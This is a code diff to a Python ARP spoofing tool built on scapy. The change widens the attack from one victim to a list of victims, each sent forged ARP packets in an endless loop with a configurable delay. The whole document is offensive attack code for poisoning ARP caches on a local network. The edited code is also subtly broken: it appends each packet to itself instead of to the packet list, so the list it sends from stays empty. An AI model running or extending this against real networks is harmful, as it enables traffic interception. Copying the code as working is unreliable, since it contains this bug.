@@ -8,7 +8,7 @@ class ArpSpoofing():
     def __init__(self, intFace):
         self.interface = intFace
 
-    def doSpoof(self, hostToAttack, hostToSpoof):
+    def doSpoof(self, hostToAttack, hostToSpoof, timeSleep):
 
         #This method obtains your own mac address
         def obtainMac():
@@ -26,17 +26,24 @@ class ArpSpoofing():
         etherPart = Ether(src=myMac)
 
         #Arp part of packet
-        arpPart = ARP(op="who-has", hwsrc=myMac, psrc=hostToSpoof, pdst=hostToAttack)
+        arpPartList = []
+        for ip in hostToAttack:
+            arpPart = ARP(op="who-has", hwsrc=myMac, psrc=hostToSpoof, pdst=ip)
+            arpPartList.append(arpPart)
 
         #total packet
-        packet = etherPart / arpPart
+        packetList = []
+        for part in arpPartList:
+            packet = etherPart / part
+            packet.append(packet)
 
         #sends packet
 
         while True:
-            sendp(packet, iface=self.interface, verbose=False)
+            for item in packetList:
+                sendp(item, iface=self.interface, verbose=False)
             print("Spoof Spoof")
-            time.sleep(5)
+            time.sleep(timeSleep)
 
 
 
